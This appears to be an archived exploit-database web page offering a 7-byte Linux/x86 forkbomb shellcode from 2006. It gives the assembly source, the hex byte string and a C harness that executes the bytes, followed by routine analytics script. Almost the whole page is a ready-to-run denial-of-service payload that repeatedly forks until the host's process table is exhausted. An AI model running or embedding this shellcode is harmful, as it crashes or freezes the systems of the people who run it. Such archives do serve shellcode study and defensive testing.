<html><head><title>Linux/x86 - forkbomb - 7 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* By Kris Katterjohn 8/29/2006
 *
 * 7 byte shellcode for a forkbomb
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *      push byte 2
 *      pop eax
 *      int 0x80
 *      jmp short _start
 */

main()
{
       char shellcode[] = &quot;\x6a\x02\x58\xcd\x80\xeb\xf9&quot;;

       (*(void (*)()) shellcode)();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
